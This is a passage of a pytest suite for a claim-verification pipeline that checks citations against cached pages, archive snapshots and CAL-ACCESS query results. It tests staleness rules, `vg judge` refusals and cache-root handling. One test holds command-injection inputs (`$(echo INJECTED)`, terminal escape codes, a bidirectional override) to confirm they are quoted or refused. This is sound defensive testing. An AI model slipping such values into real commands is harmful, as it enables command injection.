    [out] = json.loads((tmp_path / "claims" / "q1.json").read_text())["sources"]
    assert (out["archive_url"], out["archive_status"]) == (older, "archived")
    assert out["verification"]["status"] == "verified_via_archive"

    # But a real capture is kept even where the citing snippet is missing from it: that can be
    # the snippet's fault, and a researcher's retry would find the good capture gone.
    stub[SNAP] = _page(url=SNAP)
    arch.save_records(tmp_path, {PAYWALLED: {"snapshot": SNAP, "error": None}})
    (tmp_path / "claims" / "q1.json").write_text(Claim(
        question_id="q1", question="?", answer="a",
        sources=[_paywalled(snippet="a quote nobody ever wrote")]).model_dump_json())
    cli.archive(data=tmp_path, delay=0)
    assert arch.load_records(tmp_path)[PAYWALLED]["snapshot"] == SNAP


def test_a_snapshot_is_judged_by_where_its_fetch_ended_up(stub, tmp_path):
    """Fetches follow redirects, and the Wayback Machine redirects to the nearest capture,
    which replays whatever that capture recorded — including a redirect to another page. A
    snapshot URL naming the cited page proves nothing about the page that came back."""
    from vgpipe.verify import apply_archive, verify_against_archive

    elsewhere = "https://web.archive.org/web/20260101000000/https://ocregister.com/subscribe"
    stub[PAYWALLED] = _gated(PAYWALLED)
    stub[SNAP] = _page(url=SNAP, final_url=elsewhere)   # it still carries the snippet
    records = {PAYWALLED: {"snapshot": SNAP, "error": None}}

    out = apply_archive(_paywalled(), records, tmp_path)
    assert out.archive_status == "archive_unusable" and "redirected to" in out.archive_note
    assert verify_against_archive(_paywalled(archive_url=SNAP), tmp_path).verification.status == (
        "could_not_verify_paywall")
    claimed = _paywalled(archive_url=SNAP)
    claimed.verification.status = "verified_via_archive"
    out = revalidate_from_cache(claimed, tmp_path, rules=RULES)
    assert out.verification.status == "human_review" and "redirected to" in out.verification.reason

    # the usual redirect, to the nearest capture of the same page, is fine
    stub[SNAP] = _page(url=SNAP, final_url=f"https://web.archive.org/web/20260315123456/{PAYWALLED}")
    assert apply_archive(_paywalled(), records, tmp_path).archive_status == "archived"


# --- a verdict with nothing to compare against reads stale, not fresh --------------------


def _judged(root, s, *, page_at=None, version=None, judged_at=None):
    """Record a `supports` verdict on `s` into `root`, stamped as given ("" = unstamped), and
    optionally back-date when it was judged."""
    import json

    from vgpipe import judgments
    from vgpipe.models import EXTRACTOR_VERSION

    judgments.record(root, "q1", s.sid, "supports", "fine",
                     page_fetched_at="" if page_at is None else page_at,
                     extractor_version=EXTRACTOR_VERSION if version is None else version)
    if judged_at is not None:
        p = judgments.path_for(root, "q1")
        raw = json.loads(p.read_text())
        raw[0]["judged_at"] = judged_at
        p.write_text(json.dumps(raw))
    return Claim(question_id="q1", question="?", answer="a", sources=[s])


def test_a_stamped_verdict_whose_page_is_gone_is_stale(tmp_path):
    """`is_stale()` returned "" as soon as the page lookup came back empty, so a deleted page,
    a moved or mistyped cache root, or a page file that no longer parsed each applied the
    verdict with no comparison behind it. Nothing to compare against is not evidence of fresh."""
    from vgpipe import judgments
    from vgpipe.fetch import cache_path

    s = src()
    _cache_judged_page(tmp_path, s.url)
    page_at, _ = _stamp(tmp_path, s.url)
    claim = _judged(tmp_path, s, page_at=page_at)
    assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == []
    assert claim.sources[0].verification.support == "supports"

    for gone in ("wrong root", "unparseable", "deleted"):
        root = tmp_path / "elsewhere" if gone == "wrong root" else tmp_path
        if gone == "deleted":
            cache_path(tmp_path, s.url).unlink()
        elif gone == "unparseable":
            cache_path(tmp_path, s.url).write_text("{not a page")
        stale = judgments.apply_to(claim, tmp_path, cache_root=root)
        assert len(stale) == 1 and f"not in the cache at {root}" in stale[0], (gone, stale)
        assert claim.sources[0].verification.support == "unreviewed", gone


def test_vg_judgments_counts_a_verdict_whose_page_is_gone_as_stale(tmp_path):
    """The gate has to agree with build: a stamped `supports` whose page has left the cache is
    stale, so it is counted as needing a verdict rather than as done."""
    from vgpipe.fetch import cache_path

    data = _judgments_fixture(tmp_path)
    assert _unjudged(data, "q2") == (1, 2, 1, 0)
    _, out = _judgments_output(data, "--question-id", "q2")
    assert "1 verdict(s) predate the page they judged" in out, out

    cache_path(data, "https://calmatters.org/d").unlink()   # q2's fresh `contradicts`
    _, out = _judgments_output(data, "--question-id", "q2")
    assert "2 verdict(s) predate the page they judged, or have no cached page" in out, out
    # and with no page, revalidation has no context either: it waits on `vg verify`, not on a
    # verifier, so it is blocked rather than in the count
    assert _unjudged(data, "q2") == (1, 2, 1, 1)


def test_page_times_are_compared_as_times_not_text(tmp_path):
    """`str(fetched_at)` writes a space before the time; an ISO stamp written any other way (a
    `T`, a `Z`) sorted wrong against it as text. And a cache holding an OLDER copy than the one
    judged — a merged stray, a restored backup — is a different copy too."""
    from datetime import timedelta

    from vgpipe import judgments
    from vgpipe.fetch import cache_path

    s = src()
    fetched = datetime(2026, 9, 1, 12, 0, 0, tzinfo=UTC)
    cache_path(tmp_path, s.url).write_text(_page(fetched_at=fetched).model_dump_json())

    for written in ("2026-09-01T12:00:00Z", "2026-09-01T12:00:00+00:00",
                    "2026-09-01 12:00:00+00:00", "2026-09-01T12:00:00"):
        claim = _judged(tmp_path, s, page_at=written)
        assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == [], written

    later = (fetched + timedelta(seconds=1)).isoformat()
    earlier = (fetched - timedelta(seconds=1)).isoformat()
    for stamp_, word in ((earlier, "re-fetched"), (later, "older copy"),
                         ("yesterday", "cannot be read")):
        claim = _judged(tmp_path, s, page_at=stamp_)
        stale = judgments.apply_to(claim, tmp_path, cache_root=tmp_path)
        assert len(stale) == 1 and word in stale[0], (stamp_, stale)


def test_a_legacy_unstamped_verdict_is_checked_against_when_it_was_judged(tmp_path):
    """Every verdict in the committed run predates stamping (324 of 324), so "unstamped means
    fresh" left all of them unable to go stale, and "unstamped means stale" would re-judge the
    whole run. The time it was judged still bounds the copy it could have seen: a page fetched
    no later is the one that was cached then; one fetched after is not."""
    from datetime import timedelta

    from vgpipe import judgments
    from vgpipe.fetch import cache_path

    s = src()
    judged = datetime(2026, 8, 22, 18, 0, 0, tzinfo=UTC)

    def cached(at):
        cache_path(tmp_path, s.url).write_text(_page(fetched_at=at).model_dump_json())

    claim = _judged(tmp_path, s, version=0, judged_at=judged.isoformat())
    cached(judged - timedelta(days=1))
    assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == []
    assert claim.sources[0].verification.support == "supports"
    # fetched earlier in the same second it was judged: judged_at is written to the second
    cached(judged + timedelta(microseconds=500_000))
    assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == []

    cached(judged + timedelta(hours=1))
    stale = judgments.apply_to(claim, tmp_path, cache_root=tmp_path)
    assert len(stale) == 1 and "before verdicts were stamped" in stale[0]

    cache_path(tmp_path, s.url).unlink()
    stale = judgments.apply_to(claim, tmp_path, cache_root=tmp_path)
    assert len(stale) == 1 and "not in the cache" in stale[0]

    cached(judged - timedelta(days=1))
    claim = _judged(tmp_path, s, version=0, judged_at="")
    stale = judgments.apply_to(claim, tmp_path, cache_root=tmp_path)
    assert len(stale) == 1 and "no readable time" in stale[0]


def test_a_query_citation_verdict_needs_no_page(tmp_path, monkeypatch):
    """A query citation has no page by design, so "no page" must not make its verdict stale:
    what it judged is the query's result, which build re-runs every time. (What does make it
    stale is another query definition, so this one is stamped with the current one.)"""
    from vgpipe import judgments, queries
    from vgpipe.models import QueryCitation

    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(
        lambda root, **kw: queries.QueryResult(value=12345.0), ("filer_id",), "test", 1))
    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    claim = _judged(tmp_path, s, page_at="", version=0)
    judgments.record(tmp_path, "q1", s.sid, "supports", "fine", query_version=1)
    assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == []
    assert claim.sources[0].verification.support == "supports"


# --- `vg judge` refuses a verdict nothing would read --------------------------------------


def _vg(*args):
    import re

    from typer.testing import CliRunner

    from vgpipe import cli

    width = cli.con.width
    cli.con.width = 10_000   # rich folds a long tmp path mid-word at 80 columns
    try:
        res = CliRunner().invoke(cli.app, [str(a) for a in args])
    finally:
        cli.con.width = width
    # styled segments when FORCE_COLOR is set
    return res.exit_code, re.sub(r"\x1b\[[0-9;]*m", "", " ".join(res.output.split()))


def _shard_files(run):
    d = run / "judgments"
    return {p.name: p.read_bytes() for p in d.iterdir()} if d.exists() else {}


def test_judge_refuses_a_question_id_no_claim_has(tmp_path):
    """`vg judge q07 <sid>` for claim q7 wrote judgments/q07.json and printed success: a shard
    nothing reads, and a judgment pass that looks done when it isn't. On a case-insensitive
    disk `Q1` is worse — build reads Q1.json as q1.json while `vg judgments` misses it — so the
    id must match a claim's exactly, case included."""
    _, cand, s = _candidate_run(tmp_path)
    for typo in ("q01", "Q1"):
        code, out = _vg("judge", typo, s.sid, "supports", "--data", cand)
        assert code == 1 and f"no claim has question id {typo}" in out, out
        assert "did you mean q1?" in out, out
        assert _shard_files(cand) == {}, f"`vg judge {typo}` wrote a verdict"

    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 0 and "supports recorded for q1" in out, out
    assert list(_shard_files(cand)) == ["q1.json"]


def test_judge_refuses_a_source_the_named_claim_does_not_cite(tmp_path):
    """The sid was matched across every claim and never against the named one, so a verdict
    on q2's source filed under q1 lapsed as an orphan while the command said it was recorded."""
    data, cand, s = _candidate_run(tmp_path)
    other = src(url="https://sacbee.com/b", publisher="Sacramento Bee")
    (cand / "claims" / "q2.json").write_text(
        Claim(question_id="q2", question="?", answer="b", sources=[other]).model_dump_json())

    code, out = _vg("judge", "q1", other.sid, "supports", "--data", cand)
    assert code == 1 and f"claim q1 does not cite source {other.sid}; q2 does" in out, out
    code, out = _vg("judge", "q1", "0123456789ab", "supports", "--data", cand)
    assert code == 1 and "no current claim cites it" in out, out
    assert _shard_files(cand) == {}


def test_judge_refuses_when_the_claim_it_names_cannot_be_read(tmp_path):
    """An unreadable claim is skipped by the loader, so the check cannot be made: whether that
    claim cites the source is exactly what is unknown."""
    _, cand, s = _candidate_run(tmp_path)
    (cand / "claims" / "q2.json").write_text('{"question_id": "q2"}')   # fails the schema

    code, out = _vg("judge", "q2", s.sid, "supports", "--data", cand)
    assert code == 1 and "claim q2 could not be read" in out, out
    # an id matching nothing readable may be the unreadable one, so that refuses too
    (cand / "claims" / "q2.json").write_text('{"question_id": ""}')     # id not in the file
    code, out = _vg("judge", "q9", s.sid, "supports", "--data", cand)
    assert code == 1 and "it may be one of those" in out, out
    # ...without losing the hint for a typo of a claim that WAS read
    code, out = _vg("judge", "Q1", s.sid, "supports", "--data", cand)
    assert code == 1 and "did you mean q1?" in out and "could not be read" in out, out
    assert _shard_files(cand) == {}

    code, _ = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 0, "an unreadable claim elsewhere does not block a checkable verdict"


def test_judge_refuses_a_page_that_is_not_cached(tmp_path):
    """An uncached page stamped ("", 0), and both staleness checks were guarded by truthiness —
    so a verdict judged before its page was fetched could never go stale, however often the
    page changed afterwards. Refused instead, pointing at `vg verify`."""
    from vgpipe.fetch import cache_path

    data, cand, s = _candidate_run(tmp_path)
    cache_path(data, s.url).unlink()
    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 1 and "is not in the page cache" in out and "vg verify" in out, out
    assert _shard_files(cand) == {}


def test_judge_success_line_prints_a_note_as_written(tmp_path):
    """The success line printed the agent's note as rich markup, after the verdict was on disk:
    `[/]` in a note raised, and the command exited non-zero — which verifiers are told means
    nothing was recorded, so they would record it again or report a failure."""
    from vgpipe import judgments

    _, cand, s = _candidate_run(tmp_path)
    code, out = _vg("judge", "q1", s.sid, "topic_only", "--note", "roster only [/] no [sic]",
                    "--data", cand)
    assert code == 0 and "roster only [/] no [sic]" in out, out
    assert judgments.load(cand, "q1")[s.sid].note == "roster only [/] no [sic]"


def _register_test_total(monkeypatch):
    from vgpipe import queries

    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(
        lambda root, **kw: queries.QueryResult(value=12345.0), ("filer_id",), "test", 1))


def test_judge_records_a_query_citation_with_no_page(tmp_path, monkeypatch):
    """A query citation has no page by design: refusing it for want of one would leave its
    claim unjudgeable. (It does need a `vg verify` run under the current definition.)"""
    from vgpipe import judgments
    from vgpipe.models import QueryCitation

    _register_test_total(monkeypatch)
    q = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[q]).model_dump_json())
    assert _vg("verify", "--data", tmp_path)[0] == 0
    code, out = _vg("judge", "q1", q.sid, "supports", "--data", tmp_path)
    assert code == 0, out
    assert judgments.load(tmp_path, "q1")[q.sid].verdict == "supports"


@pytest.mark.parametrize("cmd", [["judge", "q1", "{sid}", "supports"], ["judgments"],
                                 ["build"], ["status"], ["verify"], ["fetch", "{url}"]])
def test_a_cache_directory_given_as_the_root_is_refused(tmp_path, cmd):
    """`--cache` names the directory holding cache/, so the natural `--cache data/cache` looked
    in data/cache/cache/pages, found nothing, stamped every verdict empty and passed every
    check — and fetch or verify quietly created a second cache there, which then satisfied
    every later check. A cache directory is recognisable, so every command refuses one."""
    data, cand, s = _candidate_run(tmp_path)
    before = _shard_files(cand)
    args = [a.replace("{sid}", s.sid).replace("{url}", s.url) for a in cmd]
    code, out = _vg(*args, "--data", cand, "--cache", data / "cache")
    assert code == 1 and f"this looks like --cache {data}" in out, out
    assert not (data / "cache" / "cache").exists(), "a second cache was created"
    assert _shard_files(cand) == before

    code, out = _vg(*args, "--data", cand, "--cache", data)   # the right root still works
    assert "cache directory itself" not in out, out


@pytest.mark.parametrize("cmd", [["judge", "q1", "{sid}", "supports"], ["judgments"],
                                 ["build"], ["status"]])
def test_a_cache_root_with_no_cache_is_refused_by_the_readers(tmp_path, cmd):
    """These commands only read the cache, so an explicit root holding none can only be wrong:
    every verdict would read stale against it, and a run would look like it needs re-judging."""
    _, cand, s = _candidate_run(tmp_path)
    before = _shard_files(cand)
    args = [a.replace("{sid}", s.sid) for a in cmd]
    code, out = _vg(*args, "--data", cand, "--cache", tmp_path / "typo")
    assert code == 1 and "holds no cache/ directory" in out, out
    assert not (tmp_path / "typo").exists()
    assert _shard_files(cand) == before


def test_a_cache_root_holding_only_the_calaccess_database_is_accepted(tmp_path, monkeypatch):
    """A run citing only queries needs the CAL-ACCESS database and no pages, so the readers ask
    for a cache/, not for cache/pages."""
    from vgpipe import judgments
    from vgpipe.models import QueryCitation

    _register_test_total(monkeypatch)
    q = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    run, root = tmp_path / "run", tmp_path / "root"
    (run / "claims").mkdir(parents=True)
    (run / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[q]).model_dump_json())
    (root / "cache" / "calaccess").mkdir(parents=True)
    assert _vg("verify", "--data", run, "--cache", root)[0] == 0
    code, out = _vg("judge", "q1", q.sid, "supports", "--data", run, "--cache", root)
    assert code == 0, out
    assert judgments.load(run, "q1")[q.sid].verdict == "supports"


def test_a_missing_default_cache_is_named_not_silent(tmp_path):
    """Without --cache the root is inferred, and a run that hasn't verified yet has no cache —
    so these warn rather than refuse. Every page verdict then reads stale, and the warning is
    what says why."""
    data, cand, s = _candidate_run(tmp_path)
    code, _ = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 0
    (data / "cache").rename(tmp_path / "gone")
    for cmd in ("judgments", "build", "status"):
        _, out = _vg(cmd, "--data", cand)
        assert f"no cache at {data / 'cache'}" in out, (cmd, out)


def test_vg_judgments_reports_verdicts_under_an_id_no_claim_has(tmp_path):
    """`vg judgments` only looked for orphans inside shards named after current claims, so a
    shard under a mistyped id was invisible to every command."""
    import shutil

    from vgpipe import judgments

    _, cand, s = _candidate_run(tmp_path)
    judgments.record(cand, "q1", s.sid, "supports", "fine")
    shutil.copy(judgments.path_for(cand, "q1"), cand / "judgments" / "q01.json")
    _, out = _vg("judgments", "--data", cand)
    assert "1 verdict(s) sit in judgments/ under an id no claim has (q01.json)" in out, out


def test_vg_judgments_reads_a_miscased_shard_as_build_does(tmp_path):
    """On a case-insensitive disk `vg build` opens Q1.json for claim q1 and applies it, while
    `vg judgments` keyed shards by exact stem and counted q1 as unjudged — and re-judging as
    q1 wrote into Q1.json, whose name never changes, so the count could never reach 0. The two
    must agree on either kind of disk, and the shard must be named so it can be fixed."""
    import json

    data, cand, s = _candidate_run(tmp_path)
    page_at, ver = _stamp(data, s.url)
    (cand / "judgments").mkdir()
    (cand / "judgments" / "Q1.json").write_text(json.dumps([{
        "sid": s.sid, "verdict": "supports", "note": "fine", "judged_at": "",
        "judge": "verifier", "page_fetched_at": page_at, "extractor_version": ver}]))

    folds_case = (cand / "judgments" / "q1.json").exists()   # asked of this disk, as the code does
    need = _unjudged(cand)[0]
    assert need == len(_built_unreviewed(cand)), "vg judgments and vg build disagree"
    assert need == (0 if folds_case else 1)

    _, out = _vg("judgments", "--data", cand)
    if folds_case:
        # build applies it as q1's, so --repair knows its claim unasked — and renames it, where
        # it refused while the re-home deleted the verdicts it wrote there
        assert "Q1.json differ from a claim's id only in case, and this disk opens" in out, out
        assert "`vg judgments --repair` renames each to its claim's exact id" in out, out
        code, repaired = _vg("judgments", "--data", cand, "--repair")
    else:
        # nothing reads it here, and a source id alone never moves a verdict: --repair
        # re-files it once told where it belongs
        assert "under an id no claim has (Q1.json)" in out, out
        before = _shard_files(cand)
        code, repaired = _vg("judgments", "--data", cand, "--repair")
        assert code == 1 and "no claim holds Q1; also cited by q1" in repaired, repaired
        assert _shard_files(cand) == before
        code, repaired = _vg("judgments", "--data", cand, "--repair", "--moved", "Q1:q1")
    assert code == 0 and "re-homed 1 verdict(s)" in repaired, repaired
    assert sorted(_shard_files(cand)) == ["q1.json"]
    _, out = _vg("judgments", "--data", cand)
    assert "only in case" not in out and "no claim has" not in out, out
    assert _unjudged(cand)[0] == 0 and not _built_unreviewed(cand)



# --- query versions, export dates and the cache root ----------------------------------------


def _dated_export(root, when=(2026, 9, 20, 3, 0, 0)):
    """The IE export from `_ie_export`, its entries dated `when` as SOS dates them, built."""
    import zipfile

    from vgpipe import calaccess

    staging = _ie_export(root / "staging")
    zp = calaccess.zip_path(root)
    zp.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(calaccess.zip_path(staging)) as undated, zipfile.ZipFile(zp, "w") as zf:
        for member in undated.infolist():
            zf.writestr(zipfile.ZipInfo(member.filename, date_time=when), undated.read(member))
    calaccess.build(root)
    return root


def _plain(output: str) -> str:
    """CLI output without rich's colour codes, whitespace collapsed (rich wraps lines)."""
    return " ".join(re.sub(r"\x1b\[[0-9;]*m", "", output).split())


OPPOSE_KO = {"candidate_last": "Ko", "first": "Dana", "stance": "oppose",
             "since": "2025-01", "until": "2026-12"}


def _ie_citation(expected="612345.67"):
    from vgpipe.calaccess import filing_url
    from vgpipe.models import QueryCitation

    return src(url=filing_url(1), publisher="California Secretary of State",
               author="California Secretary of State", source_type="official_record",
               date="2026-05-24", snippet="independent expenditures opposing Dana Ko",
               query=QueryCitation(name="calaccess.ie_total", params=OPPOSE_KO,
                                   expected=expected))


def test_calaccess_build_records_which_export_it_was_built_from(tmp_path):
    """The export refreshes nightly, and nothing recorded which one a figure was checked
    against — so a figure that moved could not be told apart from a query fix or a wrong
    citation. The date is the export's own (its entries' timestamps), not the build's."""
    import sqlite3
    import zipfile

    from vgpipe import calaccess

    root = _dated_export(tmp_path)
    info = calaccess.export_info(root)
    assert (info["export_date"], info["export_date_from"]) == ("2026-09-20", "export")
    assert info["built_at"].startswith(datetime.now(UTC).date().isoformat())

    # a zip whose entries carry no timestamp (the format's 1980 zero) is dated by download,
    # and says so rather than passing that off as the export's date
    zp = calaccess.zip_path(root)
    with zipfile.ZipFile(zp) as zf:
        blob = {m.filename: zf.read(m) for m in zf.infolist()}
    with zipfile.ZipFile(zp, "w") as zf:
        for name, data in blob.items():
            zf.writestr(zipfile.ZipInfo(name), data)
    calaccess.build(root)
    info = calaccess.export_info(root)
    assert info["export_date_from"] == "download"
    # local time, as zip timestamps are: in UTC a late-evening download dates to the next day
    assert info["export_date"] == datetime.fromtimestamp(zp.stat().st_mtime).date().isoformat()

    # one malformed entry costs its own stamp, not every other entry's
    with zipfile.ZipFile(zp, "w") as zf:
        for i, (name, data) in enumerate(blob.items()):
            zf.writestr(zipfile.ZipInfo(name, date_time=(2026, 9, 20, 3, 0, 0)), data)
        zf.writestr(zipfile.ZipInfo("CalAccess/DATA/BROKEN.TSV", date_time=(2026, 13, 1, 0, 0, 0)),
                    "x\n")
    calaccess.build(root)
    info = calaccess.export_info(root)
    assert (info["export_date"], info["export_date_from"]) == ("2026-09-20", "export")

    # a database built before exports were dated reads as unknown, not as an error...
    con = sqlite3.connect(calaccess.db_path(root))
    con.execute(f'DROP TABLE "{calaccess.EXPORT_META}"')
    con.commit()
    con.close()
    assert calaccess.export_info(root) == {}
    # ...and asking where there is no database creates none
    assert calaccess.export_info(tmp_path / "nowhere") == {}
    assert not (tmp_path / "nowhere").exists()


def test_a_query_citation_is_stamped_with_what_it_was_checked_against(tmp_path):
    """A figure is reproducible only with the definition that computed it, the export it was
    computed from, and the database that was read. The stamp is machine-owned and comes from
    the run itself, and the review page prints it beside the command."""
    import html
    import shlex

    from vgpipe import queries
    from vgpipe.report import render

    root = _dated_export(tmp_path / "shared")
    s = verify_source(_ie_citation(), root)
    v = s.verification
    assert v.status == "verified", v.reason
    assert v.query_run.version == queries.REGISTRY["calaccess.ie_total"].version
    assert v.query_run.export_date == "2026-09-20"
    assert v.query_run.cache_root == str(root)
    assert shlex.split(v.reason.split(": ", 1)[1])[5:7] == ["--cache", str(root)]

    # a mismatch is stamped too: the reviewer has to be able to reproduce a failure
    wrong = verify_source(_ie_citation(expected="615000"), root).verification
    assert wrong.status == "snippet_not_found"
    assert wrong.query_run.export_date == "2026-09-20"
    assert f"--cache {shlex.quote(str(root))}" in wrong.reason

    claim = Claim(question_id="q1", question="?", answer="a", sources=[s])
    page = html.unescape(render([claim], tmp_path / "out")[0].read_text())
    assert f"calaccess.ie_total v{v.query_run.version}" in page
    assert "CAL-ACCESS export of 2026-09-20" in page
    assert f"uv run vg query calaccess.ie_total --cache {shlex.quote(str(root))}" in page


def test_the_stamp_is_the_pipelines_to_write(tmp_path):
    """An agent that could write its own stamp could claim its figure was checked under the
    current definition. The stamp lives inside `verification`, which strip_machine_fields()
    discards from agent-authored claims, and a trusted load re-derives it at build."""
    import json

    from vgpipe import cli, queries
    from vgpipe.models import strip_machine_fields

    root = _dated_export(tmp_path)
    forged = json.loads(Claim(question_id="q1", question="?", answer="a",
                              sources=[_ie_citation()]).model_dump_json())
    forged["sources"][0]["verification"] = {
        "status": "verified", "support": "supports",
        "query_run": {"version": 99, "export_date": "2099-01-01", "cache_root": "/elsewhere"}}
    loaded = Claim.model_validate(strip_machine_fields(forged))
    assert loaded.sources[0].verification.query_run is None
    assert loaded.sources[0].verification.status == "pending"

    # trusted (build): the query is re-run and the stamp replaced with what that run read
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(json.dumps(forged))
    trusted = cli.load_claims(tmp_path / "claims", trust_machine_fields=True)[0].sources[0]
    assert trusted.verification.query_run.version == 99
    run = revalidate_from_cache(trusted, root, rules=RULES).verification.query_run
    current = queries.REGISTRY["calaccess.ie_total"].version
    assert (run.version, run.export_date, run.cache_root) == (current, "2026-09-20", str(root))


def test_a_stamped_cache_root_cannot_smuggle_text_into_the_command():
    """The root is printed into a command a human pastes, and on a row build does not re-run it
    is read back from the claim file. Same rule as a parameter: refuse what quoting cannot
    neutralize, quote the rest."""
    import shlex

    from vgpipe import queries
    from vgpipe.models import QueryRun

    for bad in ("data\n", "data\x1b[201~", "da‮ta"):
        with pytest.raises(ValueError):
            QueryRun(version=1, cache_root=bad)
        assert queries.human_command("calaccess.filer_total", {"filer_id": "1"}, bad) == ""

    cmd = queries.human_command("calaccess.filer_total", {"filer_id": "1"},
                                "/tmp/my cache $(echo INJECTED)")
    assert shlex.split(cmd)[5:7] == ["--cache", "/tmp/my cache $(echo INJECTED)"]
    # a relative root starting with '-' would be read as an option
    assert shlex.split(queries.human_command("calaccess.filer_total", {}, "-x"))[5:7] == [
        "--cache", "./-x"]


def test_a_query_verified_with_cache_reproduces_as_printed(tmp_path):
    """`vg verify --cache X` checked the figure against X's database, but the review page
    printed `vg query …` with no --cache, which resolved `data/` — a different database or
    none. The green row could not be reproduced by the command printed next to it."""
    import html
    import json
    import re
    import shlex

    from typer.testing import CliRunner

    from vgpipe import cli, queries

    shared = _dated_export(tmp_path / "shared")
    data = tmp_path / "data"
    (data / "claims").mkdir(parents=True)
    (data / "claims" / "q1.json").write_text(Claim(
        question_id="q1", question="?", answer="a", sources=[_ie_citation()]).model_dump_json())

    for step in ("verify", "build"):
        res = CliRunner().invoke(cli.app, [step, "--data", str(data), "--cache", str(shared)])
        assert res.exit_code == 0, res.output
    built = json.loads((data / "out" / "claims.json").read_text())[0]["sources"][0]
    assert built["verification"]["status"] == "verified"
    assert built["verification"]["query_run"]["cache_root"] == str(shared)

    page = html.unescape((data / "out" / "review.html").read_text())
    argv = shlex.split(re.search(r"uv run vg query [^<\n]*", page).group(0))
    assert argv[:3] == ["uv", "run", "vg"] and "--cache" in argv
    res = CliRunner().invoke(cli.app, argv[3:], terminal_width=200)
    assert res.exit_code == 0, res.output
    out = _plain(res.output)
    assert out.startswith("612345.67")
    current = queries.REGISTRY["calaccess.ie_total"].version
    assert f"calaccess.ie_total v{current}; the CAL-ACCESS export of 2026-09-20" in out

    # the same command without the root is exactly what failed before
    i = argv.index("--cache")
    assert CliRunner().invoke(cli.app, argv[3:i] + argv[i + 2:]).exit_code == 1


@pytest.mark.parametrize("command", [
    ["query"], ["judge"], ["calaccess", "build"], ["calaccess", "filer"], ["calaccess", "cite"],
    ["calaccess", "contributions"], ["calaccess", "independent-expenditures"]])
def test_every_re_check_command_takes_cache(command):
    """A command that resolves a cache root but can't be told which one is how a reviewer
    ended up on a different database than the one a figure was verified against."""
    from typer.testing import CliRunner

    from vgpipe import cli

    res = CliRunner().invoke(cli.app, [*command, "--help"], terminal_width=200)
    assert res.exit_code == 0 and "--cache" in _plain(res.output), res.output


def _query_run_with_verdict(tmp_path, monkeypatch, version=1):
    """A run citing `test.total` (at `version`), verified and judged through the CLI."""
    from typer.testing import CliRunner

    from vgpipe import cli, queries
    from vgpipe.models import QueryCitation

    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(
        lambda root, **kw: queries.QueryResult(value=12345.0, detail="2 gift(s)"),
        ("filer_id",), "test", version))
    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    data = tmp_path / "data"
    (data / "claims").mkdir(parents=True)
    (data / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    for args in (["verify"], ["judge", "q1", s.sid, "supports"]):
        res = CliRunner().invoke(cli.app, [*args, "--data", str(data)])
        assert res.exit_code == 0, res.output
    return data, s


def test_bumping_a_query_version_flags_its_citations_and_stales_its_verdicts(tmp_path,
                                                                             monkeypatch):
    """A definition that changed but happened to return the same number used to keep its
    verdict — the sid covers name, params and expected value, not the calculation. A verdict
    is about the definition it was formed under; bumping the version retires it."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments, queries

    data, s = _query_run_with_verdict(tmp_path, monkeypatch)
    j = judgments.load(data, "q1")[s.sid]
    assert (j.query_version, j.page_fetched_at, j.extractor_version) == (1, "", 0)
    claim = cli.load_claims(data / "claims", trust_machine_fields=True)[0]
    assert judgments.apply_to(claim, data, cache_root=data) == []
    assert _unjudged(data) == (0, 1, 0, 0)

    # same number, new definition
    fn, required, desc, _ = queries.REGISTRY["test.total"]
    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(fn, required, desc, 2))
    claim = cli.load_claims(data / "claims", trust_machine_fields=True)[0]
    stale = judgments.apply_to(claim, data, cache_root=data)
    assert len(stale) == 1 and "test.total v1" in stale[0] and "v2" in stale[0]
    assert claim.sources[0].verification.support == "unreviewed"

    # vg verify re-runs the figure under v2 and flags the verdict for re-judging
    res = CliRunner().invoke(cli.app, ["verify", "--data", str(data)], terminal_width=200)
    assert res.exit_code == 0, res.output
    out = _plain(res.output)
    assert "1 verdict(s) predate the page they judged" in out and "another query definition" in out
    assert f"q1/{s.sid}: judged against test.total v1" in out
    rerun = cli.load_claims(data / "claims", trust_machine_fields=True)[0].sources[0]
    assert rerun.verification.query_run.version == 2
    assert _unjudged(data) == (1, 1, 1, 0)

    # re-judging under v2 settles it; a checkout that only knows v1 does not trust it — and
    # since its claim file was verified under v2 too, the row waits on `vg verify`, not on a
    # verifier (`vg judge` would refuse it), so it is blocked rather than counted in N
    res = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "supports", "--data", str(data)])
    assert res.exit_code == 0, res.output
    assert _unjudged(data) == (0, 1, 0, 0)
    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(fn, required, desc, 1))
    assert _unjudged(data) == (0, 1, 0, 1)
    res = CliRunner().invoke(cli.app, ["verify", "--data", str(data)])
    assert res.exit_code == 0, res.output
    assert _unjudged(data) == (1, 1, 1, 0), "re-verified: now the verifier's to judge"


def test_a_query_verdict_from_before_versioning_is_stale(tmp_path, monkeypatch):
    """Nothing says which calculation an unstamped verdict was about, and every registered name
    has changed meaning at least once — so it fails toward re-checking. A page citation's
    unstamped verdict follows its own rule instead, which this leaves alone."""
    from datetime import timedelta

    from vgpipe import judgments
    from vgpipe.fetch import cache_path

